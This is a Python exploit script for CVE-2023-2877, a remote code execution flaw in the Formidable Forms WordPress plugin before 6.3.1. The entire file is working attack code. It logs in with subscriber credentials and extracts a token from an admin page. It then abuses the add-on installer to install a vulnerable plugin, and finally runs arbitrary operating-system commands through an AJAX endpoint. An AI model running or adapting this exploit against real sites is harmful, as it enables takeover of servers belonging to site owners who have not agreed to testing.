#!/usr/bin/env python3

#
# Formidable Forms < 6.3.1 - Subscriber+ Remote Code Execution
# CVE-2023-2877
#

import argparse
import requests
import re
import os
requests.packages.urllib3.disable_warnings()
session = requests.Session()
# Setting User-Agent for all requests.
user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
session.headers.update({'User-Agent': user_agent})

def login_wordpress(url, username, password):

    # Set a real user agent header

    

    # Perform login
    login_data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': '/wp-admin/',
    }
    try:
        response = session.post(url + '/wp-login.php', data=login_data, verify=False)
        response.raise_for_status()

        # Check if logged in successfully
        if any('wordpress_logged_in' in cookie.name for cookie in session.cookies):
            print('Successfully logged in.')
        else:
            print('Failed to log in.')
    except requests.exceptions.RequestException as e:
        print('Error occurred while logging in:', str(e))

    return session

def extract_token(session, url):
    # Visit the specified page and extract the token
    try:
        response = session.get(url, verify=False)
        response.raise_for_status()

        token = re.search(r"token=(\w+)", response.text).group(1)
        print(f'Token extracted: {token}')
        return token
    except requests.exceptions.RequestException as e:
        print('If a 403 status code returned the Plugin is not installed / activted / vulnerable.')
        print('Error occurred while extracting token:', str(e))
        exit()

    return None

def install_plugin(session, url, token,plugin):
    # Install the plugin using the extracted token
    plugin_url = f"{url}/wp-json/frm-admin/v1/install-addon?token={token}&file_url=https://downloads.wordpress.org/plugin/{plugin}"
    try:
        response = session.get(plugin_url, verify=False)

        if response.status_code == 200:
           if "Destination folder already exists" in response.text:
              print("Plugin Already Installed.")
           else:
              print('Plugin installed successfully.')
              print('Now run exploit script with --cmd / -c and command.')
        else:
            print('Failed to install the plugin.')
    except requests.exceptions.RequestException as e:
        print('Error occurred while installing plugin:', str(e))

def execute_ajax_request(url, cmd):
    # Execute AJAX request with cmd value
    ajax_url = f"{url}/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:{cmd}:NULL:NULL"
    try:
        response = session.get(ajax_url, verify=False)
        if response.status_code == 400:
           print("Vulnerable Plugin for RCE is not installed.")
           print("Run Script with out --cmd / -c to install vulnerable plugin for RCE.")
           exit()
        response.raise_for_status()
        # Parse the JSON response
        data = response.json()
        if 'data' in data:
            print("Data:")
            print(data['data'])
        else:
            print("No data found.")
    except requests.exceptions.RequestException as e:
        print('Error occurred while executing AJAX request:', str(e))


def main():
    parser = argparse.ArgumentParser(description='CVE-2023-2877 - Formidable Forms < 6.3.1 - Subscriber+ Remote Code Execution Script')
    parser.add_argument('-w', '--url', required=True, help='WordPress site URL')
    parser.add_argument('-u', '--username', required=True, help='WordPress username')
    parser.add_argument('-p', '--password', required=True, help='WordPress password')
    parser.add_argument('-pl', '--plugin', required=False, default="wp-upg.2.19.zip", help='Different Plugin to Install i.e mstore-api.3.9.0.zip')
    parser.add_argument('-c', '--cmd', required=False, help='Command value')

    args = parser.parse_args()

    
    if args.cmd:
        execute_ajax_request(args.url, args.cmd)
    else:
        session = login_wordpress(args.url, args.username, args.password)
        admin_page_url = f"{args.url}/wp-admin/admin.php?page=formidable-welcome"
        token = extract_token(session, admin_page_url)
        install_plugin(session, args.url, token,args.plugin)
    

if __name__ == '__main__':
    main()